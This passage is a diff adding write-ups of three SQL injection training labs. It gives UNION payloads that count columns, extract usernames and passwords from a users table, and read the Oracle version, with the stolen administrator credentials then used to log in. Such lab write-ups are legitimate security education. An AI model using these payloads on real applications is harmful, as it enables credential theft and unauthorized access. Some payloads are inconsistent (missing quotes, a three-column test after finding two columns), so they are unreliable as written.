@@ -70,3 +70,85 @@ In this lab category we got 2nd col as string. So we replace `'a'` with the desi
 Lab is solved.
 
 ![image](https://user-images.githubusercontent.com/33444140/235350029-db8d0569-07c6-4caf-baa9-913039a30d35.png)
+
+## Lab 5: SQL injection UNION attack, retrieving data from other tables
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.
+
+The database contains a different table called users, with columns called username and password.
+
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
+
+### Sol :
+
+First we determine two no of cols by running nul values and 'a' for confirming that it contains two string values.
+
+        category=Lifestyle+union+select+'a','a'--
+        
+Then we give the username and password from users table to retreive the user credentials.
+
+        category=Lifestyle+union+select+username,password+from+users--
+        
+After running it, we can see the users information.
+
+![image](https://user-images.githubusercontent.com/33444140/235350807-d231e047-3c31-43f9-a6ee-d0bf8c80c2d7.png)
+
+Logging in as administrator with its password.
+
+![image](https://user-images.githubusercontent.com/33444140/235350892-d6d3c3af-282b-49d0-a403-211b8a6c7aa6.png)
+
+## Lab 6: SQL injection UNION attack, retrieving multiple values in a single column
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The database contains a different table called users, with columns called username and password.
+
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.
+
+![image](https://user-images.githubusercontent.com/33444140/235353628-0dcb4114-4d79-4380-8474-fb1bbc47d882.png)
+
+### Sol :
+
+First we have to check the no of cols :
+    
+        category=Pets+union+select+null,null--
+        
+Then we check for which is string related col :
+
+        category=Pets+union+select+null,null,'a'--
+        
+Then we give username and password as concatenated string
+
+        category=Pets+union+select+null,username||'~'||password+from+users--
+        
+We will get the user credentials with ~ seperator
+
+![image](https://user-images.githubusercontent.com/33444140/235354047-ea538ef2-4e48-425a-9388-4321d44d4137.png)
+
+Then we give the administrator password to solve this lab.
+
+![image](https://user-images.githubusercontent.com/33444140/235354088-49c50988-df94-47e0-bd8b-e52dd05ac795.png)
+
+## Lab 7 : SQL injection attack, querying the database type and version on Oracle
+
+This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
+
+To solve the lab, display the database version string.
+
+Make the database retrieve the strings: 'Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production'
+
+![image](https://user-images.githubusercontent.com/33444140/235354756-30e94167-685b-4de7-a325-040f9d1ac23a.png)
+
+### Sol :
+
+First we check the no of cols by injecting null values with dual for oracle database
+
+        category=Gifts'+union+select+null,null+from+dual--
+
+Then we give `SELECT * FROM v$version` to retreive the Oracle database info
+
+        category=Gifts'+union+select+null,banner+from+v$version--
+        
+We will get the database info and lab got solved
+
+![image](https://user-images.githubusercontent.com/33444140/235355211-844b8eaf-5ba2-4887-b105-f5012f86a243.png)
